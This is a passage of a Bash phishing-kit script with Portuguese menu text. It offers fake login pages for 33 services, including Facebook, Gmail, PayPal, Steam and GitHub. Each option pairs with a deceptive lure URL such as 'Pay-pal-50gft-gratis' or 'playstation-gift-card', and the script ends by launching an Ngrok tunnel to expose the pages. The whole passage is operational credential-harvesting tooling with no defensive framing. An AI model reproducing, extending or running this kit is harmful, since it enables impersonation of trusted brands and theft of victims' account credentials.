		echo -ne "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Opção invalida ,Escolha  outra  . . ."
		{ sleep 1; clear; logoYgoR; site_vk; }
	fi
}

Sx9W-info() {
	{ clear; banner; echo; }
	cat <<- EOF

	EOF
	
	read -p "${CYAN}[${WHITE}-${CYAN}]${CYAN} Selecione uma opção :${WHITE}≫ ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_facebook
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		site_instagram
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		site_gmail
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="microsoft"
		mask='http://onedrive'
		menuWeb
	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
		website="netflix"
		mask='http://netflix'
		menuWeb
	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
		website="paypal"
		mask='Pay-pal-50gft-gratis'
		menuWeb
	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
		website="steam"
		mask='http://gift-card'
		menuWeb
	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
		website="twitter"
		mask='http://twitter'
		menuWeb
	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
		website="playstation"
		mask='http://playstation-gift-card'
		menuWeb
	elif [[ "$REPLY" == 10 ]]; then
		website="tiktok"
		mask='http://tiktok'
		menuWeb
	elif [[ "$REPLY" == 11 ]]; then
		website="twitch"
		mask='http://twitch'
		menuWeb
	elif [[ "$REPLY" == 12 ]]; then
		website="pinterest"
		mask='http://pinterest'
		menuWeb
	elif [[ "$REPLY" == 13 ]]; then
		website="snapchat"
		mask='http://snapchat'
		menuWeb
	elif [[ "$REPLY" == 14 ]]; then
		website="linkedin"
		mask='http://plano-premium'
		menuWeb
	elif [[ "$REPLY" == 15 ]]; then
		website="ebay"
		mask='http://sua-conta'
		menuWeb
	elif [[ "$REPLY" == 16 ]]; then
		website="quora"
		mask='http://quora'
		menuWeb
	elif [[ "$REPLY" == 17 ]]; then
		website="protonmail"
		mask='http://protonmail'
		menuWeb
	elif [[ "$REPLY" == 18 ]]; then
		website="spotify"
		mask='http://spotify'
		menuWeb
	elif [[ "$REPLY" == 19 ]]; then
		website="reddit"
		mask='http://reddit-member-badge'
		menuWeb
	elif [[ "$REPLY" == 20 ]]; then
		website="adobe"
		mask='http://lifetime-pro'
		menuWeb
	elif [[ "$REPLY" == 21 ]]; then
		website="deviantart"
		mask='http://Sua-conta'
		menuWeb
	elif [[ "$REPLY" == 22 ]]; then
		website="badoo"
		mask='http://Sua-conta'
		menuWeb
	elif [[ "$REPLY" == 23 ]]; then
		website="origin"
		mask='http://Sua-conta'
		menuWeb
	elif [[ "$REPLY" == 24 ]]; then
		website="dropbox"
		mask='http://cloud-storage'
		menuWeb
	elif [[ "$REPLY" == 25 ]]; then
		website="yahoo"
		mask='http://yahoo'
		menuWeb
	elif [[ "$REPLY" == 26 ]]; then
		website="wordpress"
		mask='http://wordpress'
		menuWeb
	elif [[ "$REPLY" == 27 ]]; then
		website="yandex"
		mask='http://anyother-yandex'
		menuWeb
	elif [[ "$REPLY" == 28 ]]; then
		website="stackoverflow"
		mask='http://lifetime'
		menuWeb
	elif [[ "$REPLY" == 29 ]]; then
		site_vk
	elif [[ "$REPLY" == 30 ]]; then
		website="xbox"
		mask='http://sua-conta'
		menuWeb
	elif [[ "$REPLY" == 31 ]]; then
		website="mediafire"
		mask='http://mediafire'
		menuWeb
	elif [[ "$REPLY" == 32 ]]; then
		website="gitlab"
		mask='http://gitlab'
		menuWeb
	elif [[ "$REPLY" == 33 ]]; then
		website="github"
		mask='http://github'
		menuWeb
	elif [[ "$REPLY" == 99 ]]; then
		info
	elif [[ "$REPLY" == SX ]]; then
		clear 
		info
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		sair
	else
		echo -ne "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Opção invalida , tente outra.. "
		{ sleep 1; Sx9W-info; }
	fi
}

xxx.YgoR
instalar_pacotes
SX9W_NgroK
Sx9W-info